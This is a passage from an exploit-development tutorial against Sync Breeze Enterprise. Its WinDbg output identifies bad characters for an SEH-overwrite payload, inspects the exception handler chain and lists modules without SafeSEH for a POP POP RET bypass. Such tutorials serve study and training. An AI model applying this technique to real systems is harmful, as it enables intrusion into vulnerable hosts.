<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0x0171ff44</span> 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">41</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span> <span style="color:#ae81ff">42</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> ec <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span>  AAAABBBB........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">72</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span> c0 ed bc <span style="color:#ae81ff">00</span>  .<span style="color:#f92672">&gt;</span>..._..r<span style="color:#960050;background-color:#1e0010">@</span>......
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">64</span>  f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>c0 ed bc <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">00</span>  ._..<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;</span>.......<span style="color:#f92672">&gt;</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">74</span>  <span style="color:#ae81ff">29</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> dc ff <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">01</span>  )..v._.....v..q.
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">84</span>  <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">77</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span>dc df <span style="color:#ae81ff">5</span>e e0 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  M<span style="color:#f92672">%</span>.w._....<span style="color:#f92672">^</span>.....
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span><span style="color:#ae81ff">94</span>  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> f8 <span style="color:#ae81ff">5f</span> df <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ....._..........
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span>a4  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0171ff</span>b4  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span></code></pre></div><p>We can see that the payload is truncated after the &ldquo;01&rdquo; byte, which means that the &ldquo;02&rdquo; byte is a badchar.
Repeating this process leads us to the following badchars: 0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD.
For example, here I attach how I detected that 0x0A is also a badchar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span>cb000
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">0174f</span>e0c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">01750000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">0174f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span>cb000
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">00001260</span> . <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">8</span>d0
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0052</span>a988
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">003</span>c0000
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">0174f</span>e0c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x0174ff44</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x0096df5b</span>     _EXCEPTION_DISPOSITION  libpal<span style="color:#f92672">!</span>md5_starts<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dd <span style="color:#ae81ff">0x0174ff44</span> L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span> <span style="color:#ae81ff">42424242</span> <span style="color:#ae81ff">05040301</span> <span style="color:#ae81ff">09080706</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00923e00</span> <span style="color:#ae81ff">00e25</span>e18 <span style="color:#ae81ff">00</span><span style="color:#ae81ff">924072</span> <span style="color:#ae81ff">00</span>bfedc0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> dds <span style="color:#ae81ff">0x0174ff44</span> L8
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">41414141</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">48</span>  <span style="color:#ae81ff">42424242</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">05040301</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">09080706</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">54</span>  <span style="color:#ae81ff">00923e00</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0xe40</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">58</span>  <span style="color:#ae81ff">00e25</span>e18
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">00</span><span style="color:#ae81ff">924072</span> libpal<span style="color:#f92672">!</span>SCA_WinFile<span style="color:#f92672">::</span>operator<span style="color:#f92672">=+</span><span style="color:#ae81ff">0x10b2</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">00</span>bfedc0
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> db <span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">4</span>c  <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">03</span> <span style="color:#ae81ff">04</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">06</span> <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">08</span> <span style="color:#ae81ff">09</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  .........<span style="color:#f92672">&gt;</span>...<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">5</span>c  <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">40</span> <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span> c0 ed bf <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span>  r<span style="color:#960050;background-color:#1e0010">@</span>.......<span style="color:#f92672">^</span>..<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#f92672">&gt;</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">6</span>c  c0 ed bf <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">3</span>e <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">29</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  .....<span style="color:#f92672">&gt;</span>..)..v.<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">7</span>c  <span style="color:#ae81ff">10</span> d8 <span style="color:#ae81ff">07</span> <span style="color:#ae81ff">76</span> dc ff <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">05</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  ...v..t.M<span style="color:#f92672">%</span>.w.<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">8</span>c  <span style="color:#ae81ff">24</span> <span style="color:#ae81ff">19</span> dc <span style="color:#ae81ff">0</span>e <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">18</span> <span style="color:#ae81ff">5</span>e e2 <span style="color:#ae81ff">00</span>  <span style="color:#960050;background-color:#1e0010">$</span>............<span style="color:#f92672">^</span>..
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span><span style="color:#ae81ff">9</span>c  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span>ac  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0174ff</span>bc  <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>c ff <span style="color:#ae81ff">74</span> <span style="color:#ae81ff">01</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span> <span style="color:#ae81ff">00</span>  ..........t.....
</span></span></code></pre></div><p>After 09, the next byte should be 0A, but it&rsquo;s 00.</p>
<p>Now let&rsquo;s find a module of the application that have addresses without badchars and also that has SafeSEH off. The idea is to bypass SafeSEH by exploiting a module that does not implement SafeSEH, leveraging the POP R32, POP R32, RET instruction sequence from a module that was compiled without the /SAFESEH.</p>
<p><strong>Note: in order for this exploit to be portable against multiple Windows OS, we have to locate a POP, POP, RET instruction sequence inside a module that is part of the vulnerable software.</strong></p>
<p>Let&rsquo;s find the modules with the WinDbg <em>narly</em> extension. Let&rsquo;s load it and list the modules:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> .load narly
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      __s<span style="color:#f92672">|</span>I}<span style="color:#f92672">*!</span>{a.                        ._s,aan2<span style="color:#f92672">*</span>a
</span></span><span style="display:flex;"><span>     _wY1<span style="color:#f92672">+~-</span>    )S,                     .ae<span style="color:#e6db74">&#34;~=:...:X</span>
</span></span><span style="display:flex;"><span>   .vXl<span style="color:#f92672">+:</span>.       <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c                   <span style="color:#f92672">&lt;</span><span style="color:#ae81ff">2</span><span style="color:#f92672">+=|==::</span>..<span style="color:#f92672">:</span>d
</span></span><span style="display:flex;"><span>   vvi<span style="color:#f92672">=</span>;..        <span style="color:#f92672">-?</span>o,                <span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#f92672">=+==:::</span>...<span style="color:#f92672">=</span>d
</span></span><span style="display:flex;"><span>  )nv<span style="color:#f92672">=:</span>.            )<span style="color:#ae81ff">5</span>,              <span style="color:#ae81ff">.2</span><span style="color:#f92672">=--</span>.......<span style="color:#f92672">-=</span>d
</span></span><span style="display:flex;"><span>  ue<span style="color:#f92672">+::</span>              <span style="color:#f92672">-*</span>s             <span style="color:#f92672">&lt;</span>c .        .<span style="color:#f92672">=</span>d
</span></span><span style="display:flex;"><span>  m<span style="color:#f92672">&gt;==::</span>..     ._,     <span style="color:#f92672">&lt;</span>s,           )c           :d
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#==viii|===; {Xs=,    -{s          )c         ..:d
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Z;{nnonnvvii;<span style="color:#a6e22e">v</span>(<span style="color:#f92672">-</span>{<span style="color:#f92672">%=</span>.    <span style="color:#f92672">~</span>s,        )e:<span style="color:#f92672">====||</span>iiv<span style="color:#f92672">%=</span>d
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>{oooonvvIl;<span style="color:#ae81ff">3</span>;  <span style="color:#f92672">-</span>{<span style="color:#f92672">%</span>,    <span style="color:#f92672">-*&gt;</span>       )<span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;</span>onnnnvnnnn<span style="color:#f92672">&gt;</span>d
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>)vvvvIliii:<span style="color:#ae81ff">3</span>;    <span style="color:#f92672">-!</span>s.   <span style="color:#f92672">:</span>)s.     )e<span style="color:#f92672">&lt;</span>oonvlllllIid
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=&lt;</span>lllliii<span style="color:#f92672">|=:</span>n;      <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>c.  <span style="color:#f92672">+|</span><span style="color:#ae81ff">1</span>,    )z<span style="color:#f92672">&lt;</span>nvii<span style="color:#f92672">||+|+|</span>vX
</span></span><span style="display:flex;"><span>  S<span style="color:#f92672">=&lt;</span>lli<span style="color:#f92672">|||=::</span> n;        <span style="color:#e6db74">&#34;nc  -s%;   )c=ovl|++==+=vo</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=&lt;</span>i<span style="color:#f92672">||+=</span>; . .n<span style="color:#960050;background-color:#1e0010">`</span>          <span style="color:#e6db74">&#34;1&gt;.-{%i. )c&lt;Xnnli||++=vn</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">=</span>iii<span style="color:#f92672">&gt;==-</span>.  <span style="color:#f92672">:</span>o<span style="color:#960050;background-color:#1e0010">`</span>            <span style="color:#e6db74">&#34;1,:+iI,)c:Sonnvli||=v(</span>
</span></span><span style="display:flex;"><span>  X<span style="color:#f92672">&gt;</span>{ii<span style="color:#f92672">+</span>;<span style="color:#f92672">:-</span>  .<span style="color:#a6e22e">u</span>(               <span style="color:#e6db74">&#34;o,-{Iw(:nvvvllii=v2</span>
</span></span><span style="display:flex;"><span>  S<span style="color:#f92672">=</span>i<span style="color:#f92672">||</span>;<span style="color:#f92672">:</span>. .<span style="color:#f92672">=</span><span style="color:#a6e22e">u</span>(                 <span style="color:#f92672">-!</span>o,<span style="color:#f92672">+</span><span style="color:#a6e22e">I</span>(<span style="color:#f92672">:</span>iiillii<span style="color:#f92672">|</span>ie<span style="color:#960050;background-color:#1e0010">`</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span>v<span style="color:#f92672">|==</span>__su<span style="color:#f92672">?</span><span style="color:#960050;background-color:#1e0010">`</span>                    <span style="color:#f92672">-?</span>o,<span style="color:#f92672">-:==||</span>iisv<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  {nvnI<span style="color:#f92672">!</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">~</span>                         <span style="color:#f92672">-!</span>sasvv}<span style="color:#e6db74">&#34;&#34;</span><span style="color:#960050;background-color:#1e0010">`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>             by Nephi <span style="color:#a6e22e">Johnson</span> (d0c_s4vage)
</span></span><span style="display:flex;"><span>                      N <span style="color:#66d9ef">for</span> gnarly<span style="color:#f92672">!</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Available commands:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">!</span>nmod     <span style="color:#f92672">-</span> display <span style="color:#f92672">/</span>SafeSEH, <span style="color:#f92672">/</span>GS, DEP, and ASLR info <span style="color:#66d9ef">for</span>
</span></span><span style="display:flex;"><span>                all loaded modules
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>nmod
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00400000</span> <span style="color:#ae81ff">00463000</span> syncbrs              <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>syncbrs.exe
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">850000</span> <span style="color:#ae81ff">00</span><span style="color:#ae81ff">905000</span> libsync              <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libsync.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">910000</span> <span style="color:#ae81ff">009e4000</span> libpal               <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libpal.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">10000000</span> <span style="color:#ae81ff">10226000</span> libspp               <span style="color:#f92672">/</span>SafeSEH OFF                C:<span style="color:#960050;background-color:#1e0010">\</span>Program Files<span style="color:#960050;background-color:#1e0010">\</span>Sync Breeze Enterprise<span style="color:#960050;background-color:#1e0010">\</span>bin<span style="color:#960050;background-color:#1e0010">\</span>libspp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69240000</span> <span style="color:#ae81ff">69250000</span> wshbth               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>wshbth.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69280000</span> <span style="color:#ae81ff">69296000</span> pnrpnsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>pnrpnsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">692e0000</span> <span style="color:#ae81ff">692f</span><span style="color:#ae81ff">1000</span> napinsp              <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>system32<span style="color:#960050;background-color:#1e0010">\</span>napinsp.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">69880000</span> <span style="color:#ae81ff">6988e000</span> winrnr               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>System32<span style="color:#960050;background-color:#1e0010">\</span>winrnr.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>a530000 <span style="color:#ae81ff">6</span>a5cf000 ODBC32               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>ODBC32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>ab10000 <span style="color:#ae81ff">6</span>ab38000 WINMM                <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>WINMM.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>ac30000 <span style="color:#ae81ff">6</span>ac44000 NETAPI32             <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>NETAPI32.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>acd0000 <span style="color:#ae81ff">6</span>ace9000 MPR                  <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>MPR.dll
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">6</span>dbe0000 <span style="color:#ae81ff">6</span>dbfd000 SRVCLI               <span style="color:#f92672">/</span>SafeSEH ON  <span style="color:#f92672">/</span>GS <span style="color:#f92672">*</span>ASLR <span style="color:#f92672">*</span>DEP C:<span style="color:#960050;background-color:#1e0010">\</span>Windows<span style="color:#960050;background-color:#1e0010">\</span>SYSTEM32<span style="color:#960050;background-color:#1e0010">\</span>SRVCLI.DLL
